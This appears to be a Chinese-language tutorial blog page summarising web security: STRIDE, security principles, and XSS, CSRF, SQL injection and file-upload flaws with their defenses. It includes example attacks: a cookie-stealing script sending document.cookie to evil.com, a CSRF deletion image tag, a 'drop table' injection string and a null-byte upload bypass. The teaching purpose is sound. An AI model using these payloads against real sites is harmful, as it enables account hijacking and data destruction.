@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Web安全是前端和后端都需要了解的技术。只有当开发团队中的每一位成员都懂得足够多的Web安全知识，才能避免在项目中出现容易被黑客利用的漏洞。  Web安全入门安全三要素要全面认识一个安全问题有很多种方法，但是首先需要了解安全问题的基本属性。我们将安全问题总结为安全三要素，简称CIA。安全三要素有机密性（Confidentiality）、完整性（Integrity)、可用性（Availabilit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全系列——总结">
+<meta property="og:url" content="http://yoursite.com/20120/03/16/Web%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="个人博客">
+<meta property="og:description" content="Web安全是前端和后端都需要了解的技术。只有当开发团队中的每一位成员都懂得足够多的Web安全知识，才能避免在项目中出现容易被黑客利用的漏洞。  Web安全入门安全三要素要全面认识一个安全问题有很多种方法，但是首先需要了解安全问题的基本属性。我们将安全问题总结为安全三要素，简称CIA。安全三要素有机密性（Confidentiality）、完整性（Integrity)、可用性（Availabilit">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="+020120-03-16T11:43:00.000Z">
+<meta property="article:modified_time" content="2020-03-16T11:43:22.003Z">
+<meta property="article:author" content="lixiaoqin">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://yoursite.com/20120/03/16/Web%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>Web安全系列——总结 | 个人博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">个人博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/20120/03/16/Web%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lixiaoqin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Web安全系列——总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 20120-03-16 19:43:00" itemprop="dateCreated datePublished" datetime="20120-03-16T19:43:00+08:00">20120-03-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-03-16 19:43:22" itemprop="dateModified" datetime="2020-03-16T19:43:22+08:00">2020-03-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>Web安全是前端和后端都需要了解的技术。只有当开发团队中的每一位成员都懂得足够多的Web安全知识，才能避免在项目中出现容易被黑客利用的漏洞。</p>
+</blockquote>
+<h2 id="Web安全入门"><a href="#Web安全入门" class="headerlink" title="Web安全入门"></a>Web安全入门</h2><h3 id="安全三要素"><a href="#安全三要素" class="headerlink" title="安全三要素"></a>安全三要素</h3><p>要全面认识一个安全问题有很多种方法，但是首先需要了解安全问题的基本属性。我们将安全问题总结为安全三要素，简称CIA。安全三要素有机密性（Confidentiality）、完整性（Integrity)、可用性（Availability）构成。  </p>
+<a id="more"></a>
+
+<p><strong>机密性</strong>要求数据内容不能被泄露，加密是保证机密性的常见手段。<br><strong>完整性</strong>则要求内容是完整的，没有被篡改过。常见的保证完整性手段是签名。<br><strong>可用性</strong>要求保护资源是”随需而得“。假设有一个停车场，可以停100辆车，但是有一天，有人搬了100块石头来把所有车位都占用了，那么停车场的车位就都<strong>不可用</strong>了。在安全领域中，拒绝服务攻击（Denial of Service）就是用来破坏网站的可用性的。</p>
+<h3 id="威胁分析"><a href="#威胁分析" class="headerlink" title="威胁分析"></a>威胁分析</h3><p>威胁分析就是把所有的威胁都找出来。《白帽子讲Web安全》中介绍了一种威胁建模方法，它最早由微软提出，叫做STRIDE模型。  </p>
+<p>STRIDE是由6个单词的首字母组成，当我们分析威胁，可以一下6个方面考虑：</p>
+<table>
+<thead>
+<tr>
+<th>威胁</th>
+<th>定义</th>
+<th>对应的安全属性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Spoofing (伪装)</td>
+<td>冒充他人身份</td>
+<td>认证</td>
+</tr>
+<tr>
+<td>Tampering （篡改）</td>
+<td>修改数据或代码</td>
+<td>完整性</td>
+</tr>
+<tr>
+<td>Repudiation （抵赖）</td>
+<td>否认做过的事情</td>
+<td>不可抵赖性</td>
+</tr>
+<tr>
+<td>InformationDisclosure （信息暴露）</td>
+<td>机密信息泄露</td>
+<td>机密性</td>
+</tr>
+<tr>
+<td>Denial of Service （拒绝服务）</td>
+<td>拒绝服务</td>
+<td>可用性</td>
+</tr>
+<tr>
+<td>Elevation of Privilege （提升服务）</td>
+<td>未经授权获得许可</td>
+<td>授权</td>
+</tr>
+</tbody></table>
+<h3 id="Web安全原则"><a href="#Web安全原则" class="headerlink" title="Web安全原则"></a>Web安全原则</h3><p>在设计安全方案时，有着一系列的原则。遵循这些原则可以最大限度地提高系统的安全性。   </p>
+<h4 id="1-黑名单、白名单原则"><a href="#1-黑名单、白名单原则" class="headerlink" title="1. 黑名单、白名单原则"></a>1. 黑名单、白名单原则</h4><p>在制定防火墙访问控制策略时，如果网站只提供Web服务，那么正确的做法是只允许网站的80端口和433端口对外提供服务，屏蔽除此之外的其他端口。这就是“白名单”做法。当Web应用要处理用户提交的富文本时，需要考虑到XSS的问题。  </p>
+<p>过滤掉容易构成XSS攻击的标签如<code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code> 等，这就是“黑名单”做法。</p>
+<h4 id="2-最小权限原则"><a href="#2-最小权限原则" class="headerlink" title="2. 最小权限原则"></a>2. 最小权限原则</h4><p>最小权限原则要求系统只授予主体必要的权限，而不是过度授权。这样可以有效减少出错的机会。</p>
+<p>在linux系统中，一种良好的操作习惯是使用普通账户登录，在执行费需要root权限的操作时，在通过sudo命令完成。这样可以最大化降低误操作的风险。</p>
+<h4 id="3-数据与代码分离原则"><a href="#3-数据与代码分离原则" class="headerlink" title="3. 数据与代码分离原则"></a>3. 数据与代码分离原则</h4><p>数据与代码分离原则广泛适用于各种由于”注入“而引起的安全问题。以XSS为例，如果一个页面的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;test&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	$var</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>那么</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>test<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>就是代码的执行段</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var</span><br></pre></td></tr></table></figure>
+
+<p>就是代码的数据段，数据段<code>$var</code> 被当做代码片段来执行，就会引发安全问题。</p>
+<p>比如当<code>$var</code>的值为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://evil</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>浏览器就会把<code>&lt;script&gt;</code> 标签当作代码来解释。</p>
+<p>根据代码目录分离原则，应该对用户数据片段<code>$var</code> 进行安全处理，使用过滤、编码等手段，把造成代码混淆的用户数据清理掉。</p>
+<h4 id="4-纵深防御原则"><a href="#4-纵深防御原则" class="headerlink" title="4. 纵深防御原则"></a>4. 纵深防御原则</h4><p>纵深防御并不是同一个安全方案要做两遍或者多遍，而是要从不同的层面，不同的角度对系统做出整体的解决方案。</p>
+<h2 id="常见的Web攻击手段"><a href="#常见的Web攻击手段" class="headerlink" title="常见的Web攻击手段"></a>常见的Web攻击手段</h2><h3 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>跨站脚本攻击(XSS),英文全称 Cross Site Script, 是Web安全头号大敌。<br>XSS攻击，一般是指黑客通过在网页中<strong>注入恶意脚本</strong>，当用户浏览网页时，恶意脚本执行，控制用户浏览器行为的一种攻击方式。在介绍数据与代码分离原则的时候所举的例子，其实就是XSS攻击。其中，XSS攻击通常分为反射型XSS、存储型XSS、DOM Based XSS三种。</p>
+<h4 id="XSS攻击的危害"><a href="#XSS攻击的危害" class="headerlink" title="XSS攻击的危害"></a>XSS攻击的危害</h4><p>XSS Payload的本质是JavaScript脚本，所以JavaScript可以做什么，XSS攻击就可以做什么。  </p>
+<p>一个最常见的XSS Payload就是盗取用户的Cookie,从而发起Cookie劫持攻击。Cookie中，一般会保存当前用户的登录凭证，如果Cookie被黑客盗取，以为着黑客有可能通过Cookie直接登进用户的账户，进行恶意操作。  </p>
+<p>如下所示，攻击者先加载一个远程脚本：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> http:&#x2F;&#x2F;localhost&#x2F;xssTest&#x2F;test.php?userName&#x3D;&lt;scriipt src&#x3D;http:&#x2F;&#x2F;www.evil.com&#x2F;evil.js&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>而真正的XSS Payload，则写在远程脚本evil.js中。在evil.js中，可以通过下列代码窃取用户Cookie：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line"></span><br><span class="line">    img.src=<span class="string">"http://www.evil.com/log?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(img);  </span><br><span class="line"> &lt;script/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码插入了一张看不见的图片，同时把document.cookie作为参数，发到远程服务器。黑客在拿到cookie后，只需要替换掉自身的cookie，就可以登入被盗取者的账户，进行恶意操作。  </p>
+<p>一个网站的应用只需要接受HTTP的POST请求和GET请求，就可以完成所有的操作，对于黑客而言，仅通过JavaScript就可以完成这些操作。 </p>
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>其实如今一些流行的浏览器都内置了一些对抗XSS的措施，比如Firefox的CSP、IE 8内置的XSS Filter等。除此之外，还有以下防御手段</p>
+<h5 id="1-HttpOnly"><a href="#1-HttpOnly" class="headerlink" title="1. HttpOnly"></a>1. HttpOnly</h5><p>HttpOnly最早是由微软提出，并在IE6中实现的，至今已逐渐成为一个标准。浏览器将禁止页面的JavaScript访问带有HttpOnly 属性的Cookie。以下浏览器开始支持HttpOnly:  </p>
+<ul>
+<li><p>Microsoft IE 6 SP1+  </p>
+</li>
+<li><p>Mozilla FireFox 2.0.0.5+  </p>
+</li>
+<li><p>Mozilla Firefox 3.0.0.6+  </p>
+</li>
+<li><p>Google Chrome  </p>
+</li>
+<li><p>Apple Safari 4.0+  </p>
+</li>
+<li><p>Opera 9.5+</p>
+</li>
+</ul>
+<p>一个Cookie的使用过程如下：  </p>
+<p>Step1: 浏览器向服务器发送请求，这时候没有cookie。   </p>
+<p>Step2: 服务器返回同时，发送Set-Cookie头，向客户端浏览器写入Cookie。  </p>
+<p>Step3: 在该Cookie到期前，浏览器访问该域名下所有的页面，都将发送该Cookie。  </p>
+<p>而HttpOnly是在Set-Cookie时标记的。      </p>
+<h5 id="2-输入检查"><a href="#2-输入检查" class="headerlink" title="2. 输入检查"></a>2. 输入检查</h5><p>常见的Web漏洞，如XSS、SQL注入等，都要求攻击者构造一些特殊的字符串，而这些字符串是一般用户不会用到的，所以进行输入检查就很有必要了。  </p>
+<p>输入检查可以在用户输入的<strong>格式检查</strong>中进行。很多网站的用户名都要求是字母及数字的组合如“abc1234”，其实也能过滤一部分的XSS和SQL注入。但是，这种在客户端的限制很容易<strong>被绕过</strong>，攻击者可以用JavaScript或一些请求工具，直接构造请求，想网站注入XSS或者SQL。所以，除了在客户端进行格式检查，往往还需要在后端进行二次检查。客户端的检查主要作用是阻挡大部分误操作的正常用户，从而节约服务器资源。  </p>
+<h5 id="3-对输出转义"><a href="#3-对输出转义" class="headerlink" title="3. 对输出转义"></a>3. 对输出转义</h5><p>在输出数据之前对潜在的威胁的字符进行编码、转义是防御XSS攻击十分有效的措施。</p>
+<p>为了对抗XSS,在HtmlEncode中至少转换以下字符：</p>
+<p>&lt; 转成 <code>&amp;lt</code>;</p>
+<p><code>&gt;</code> 转成 <code>&amp;gt</code>;</p>
+<p>&amp; 转成 <code>&amp;amp</code>;</p>
+<p>“ 转成 <code>&amp;quot</code>;</p>
+<p>‘ 转成 <code>&amp;#39</code>  </p>
+<h3 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>CSRF全称为Cross Site Request Forgery，翻译成中文是跨站点请求伪造，是攻击者通过伪装受信任的用户，来想网站发起请求的的一种恶意攻击。听起来很像XSS攻击，但是又与XSS攻击有着本质的不同。可以通过一个简单的例子了解CSRF攻击。  </p>
+<p>某个博客网站只需要在登录后，请求这个URL，即可删除编号为“2345”的博客。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> http:&#x2F;&#x2F;blog.sohu.com&#x2F;manage&#x2F;entry.do?m&#x3D;delete&amp;id&#x3D;2345</span><br></pre></td></tr></table></figure>
+
+<p>那么，这个URL就存在CSRF漏洞，可以被攻击者进行利用。攻击者在自己的网站中，插入一张图片，代码为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;blog.sohu.com&#x2F;manage&#x2F;entry.do?m&#x3D;delete&amp;id&#x3D;2345&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使<code>&lt;img&gt;</code>标签指向删除博客的URL,即可以删除该博客。  </p>
+<h4 id="CSRF攻击与Cookie"><a href="#CSRF攻击与Cookie" class="headerlink" title="CSRF攻击与Cookie"></a>CSRF攻击与Cookie</h4><p>虽然不利用Cookie也能进行CSRF攻击，但是绝大部分破坏力强的CSRF攻击离不开对Cookie的利用。  </p>
+<p>浏览器的Cookie分为<strong>两种</strong>：一种是”Session Cookie”,又称为”临时Cookie“，另一种是”Third-party Cookie”,也称为”本地Cookie“。</p>
+<p>两者的区别在于Cookie的<strong>失效时间</strong>。Session Cookie在浏览器关闭后，Session Cookie便马上失效。而Third-party Cookie在Set-Cookie的时候，指定了Expire时间，只有到过了Exipire的时间后，Third-party Session才会失效。  </p>
+<p>显然，对于攻击者来说，Third-party Cookie比Session Cookie更加容易利用，从而进行CSRF攻击。因为，Third-party Cookie的有效时间更长，用户访问某个网站后，获取Third-party Cookie,那么在Third-party Cookie失效之前，用户都有遭受CSRF攻击的风险。  </p>
+<p>而Session Cookie一般是存放在浏览器的内存中，浏览器关闭就自动失效。攻击者要利用Session Cookie进行攻击的话，还需要先诱使用户访问目标网站，是Session有效，才能进行下一步攻击。  </p>
+<h4 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a>CSRF的防御</h4><p>CSRF是一种难以识别的攻击，对于CSRF的防御可以采取以下措施。</p>
+<h5 id="1-验证码"><a href="#1-验证码" class="headerlink" title="1. 验证码"></a>1. 验证码</h5><p>CSRF攻击是伪造成用户的身份，自动发起恶意的请求。那么我们可以强迫攻击者与我们的网站进行交互。在一些操作之前加入验证码校验，可以抵御一部分的CSRF攻击。但是加入验证码会影响用户的体验，所以验证码不能作为主要的防御手段。</p>
+<h5 id="2-Anti-CSRF-Token"><a href="#2-Anti-CSRF-Token" class="headerlink" title="2. Anti CSRF Token"></a>2. Anti CSRF Token</h5><p>CSRF攻击的原理，是攻击者伪装成用户身份，发起恶意请求。那么攻击者除了要伪装成功，还需要“猜”出请求的参数。那么如果我们在请求中，加入一个随机的Token，攻击者就永远没有办法”猜“出恶意请求的参数了，这就是Anti CSRF Token。  </p>
+<p>Token参数最好放在一个表单中，而不是放在URL里面。比如以下URL。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    http:&#x2F;&#x2F;host&#x2F;path&#x2F;manage?username&#x3D;abc&amp;token&#x3D;[random]</span><br></pre></td></tr></table></figure>
+
+<p>因为攻击者可以在当前页面植入恶意的脚本如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;evil.com&#x2F;notexist&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>则当前页面的  URL回作为HTTP请求的Refferer，发送到evil.com服务器上。因此，最好把Token放在表单中，把敏感操作由GET改为POST,这样可以增加黑客进行CSRF攻击的难度。  </p>
+<p>一定要记住的一点是：** Anti CSRF Token 仅仅是用来防御CSRF攻击，而不能防御XSS攻击。XSS攻击必须要采用相应的防御手段。</p>
+<h3 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h3><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><p>注入攻击的本质，是把用户输入的数据当作代码执行。这里有<strong>两个条件</strong>，一个是用户能够控制输入，一个是原本程序要执行的代码拼接了用户的数据。注入攻击包括SQL注入、XML注入、CRLF注入、代码注入。  </p>
+<p>下面是一个SQL注入的典型例子。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$var&#x3D;shipCity;</span><br><span class="line">$shipCity&#x3D;$_POST[&#39;shipCity&#39;];</span><br><span class="line">$shipCity&#x3D;&quot;select * from OrdersTable where ShipCity&#x3D;&#39;&quot;.$shipCity.&quot;&#39;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>变量<code>$shipCity</code> 的值由用户提交，当用户输入”Beijing“，那么将要执行的SQL语句是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM OrderTable where ShipCity&#x3D;&#39;Beijing&#39;</span><br></pre></td></tr></table></figure>
+
+<p>但如果用户输入一段有语义的SQL如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Beijing&#39;;drop table OrderTable--</span><br></pre></td></tr></table></figure>
+
+<p>那么实际执行的SQL语句如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM OrderTable WHERE ShipCity&#x3D;&#39;Beijing&#39; ; drop table OrderTable--</span><br></pre></td></tr></table></figure>
+
+<p>原本应该正常执行的查询语句，变成了一个查询语句和一个删除数据表的语句。</p>
+<h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><p>一般来说，防御SQL注入的最佳方式是<strong>预编译语句</strong>。使用预编译语句，可以使SQL代码与数据分离，避免发生语义混淆。</p>
+<p>下面是PHP中采用预编译语句的示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*  通过绑定的 PHP 变量执行一条预处理语句 */</span></span><br><span class="line">$calories = <span class="number">150</span>;</span><br><span class="line">$colour = <span class="string">'red'</span>;</span><br><span class="line">$sth = $dbh-&gt;prepare(<span class="string">'SELECT name, colour, calories</span></span><br><span class="line"><span class="string">    FROM fruit</span></span><br><span class="line"><span class="string">    WHERE calories &lt; ? AND colour = ?'</span>);</span><br><span class="line">$sth-&gt;bindParam(<span class="number">1</span>, $calories, PDO::PARAM_INT);</span><br><span class="line">$sth-&gt;bindParam(<span class="number">2</span>, $colour, PDO::PARAM_STR, <span class="number">12</span>);</span><br><span class="line">$sth-&gt;execute();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h4 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h4><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过次脚本文件获得了执行服务端命令的权利。</p>
+<p>文件上传后导致的常见安全问题有：</p>
+<ul>
+<li>上传文件是Web脚本语言，服务端的Web容器解释并执行了用户上传的脚本，导致恶意代码执行。</li>
+<li>上传文件是Flash的策略文件 crossdomain.xml，黑客用以控制Flash在该域下的行为。</li>
+<li>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。</li>
+<li>上传文件是钓鱼图片或者包含了脚本的图片，在某些版本的浏览器中会被当作脚本执行，用于钓鱼和欺诈。</li>
+</ul>
+<h4 id="黑客如何利用文件上传漏洞"><a href="#黑客如何利用文件上传漏洞" class="headerlink" title="黑客如何利用文件上传漏洞"></a>黑客如何利用文件上传漏洞</h4><p>在针对上传文件的检查中，很多应用都是通过判断<strong>文件后缀名</strong>来验证文件的安全性的。但是如果黑客手段修改上传过程的POST包，在文件名后面添加一个<code>%00</code> 字节,就会阶段某些函数对文件名的判断。比如应用只允许上传JPG图片，那么可以构造文件名<code>xxx.php[\0].JPG</code>,其中<code>[\0]</code> 为十六进制的0x00字符。而 <code>JPG</code>绕过了应用的上传文件类型判断。但对于Web服务器来说，因为<code>\0</code> 的截断关系，最终会变成xxx.php。</p>
+<p>除了通过文件后缀名判断文件类型以外，有时候还会通过文件开头的字节来判断文件类型。在正常情况下，通过判断前10个字节，基本可以盘攒一个文件的真是类型。</p>
+<h4 id="设计安全的文件上传功能"><a href="#设计安全的文件上传功能" class="headerlink" title="设计安全的文件上传功能"></a>设计安全的文件上传功能</h4><p>根据文件上传漏洞的形成原理，可以通过以下方法来规避：</p>
+<h5 id="1-文件上传的目录设置为不可执行"><a href="#1-文件上传的目录设置为不可执行" class="headerlink" title="1. 文件上传的目录设置为不可执行"></a>1. 文件上传的目录设置为不可执行</h5><p>只要Web容器无法解析该目录下的文件，即使用户上传了恶意脚本，服务器本身也不会收到影响。在很多大型网站中，文件上传后会被放到独立的存储上，做静态文件处理，一方面方便使用缓存加速，另一方面也杜绝了恶意脚本执行的可能。</p>
+<h5 id="2-判断文件类型"><a href="#2-判断文件类型" class="headerlink" title="2. 判断文件类型"></a>2. 判断文件类型</h5><p>在判断文件类型是，可以结合MIME Type、后缀检查等方式。在文件类型检查中国，强烈推荐白名单的方式，而不要使用黑名单。</p>
+<h5 id="3-使用随机数改写文件和文件名路径"><a href="#3-使用随机数改写文件和文件名路径" class="headerlink" title="3. 使用随机数改写文件和文件名路径"></a>3. 使用随机数改写文件和文件名路径</h5><p>要执行上传的恶意代码，则需要恶意代码可以访问。把上传的文件文件名和路径改成随机数，那几时有恶意脚本通过了检查，上传到服务器，黑客也不能通过访问该脚本而执行恶意代码。</p>
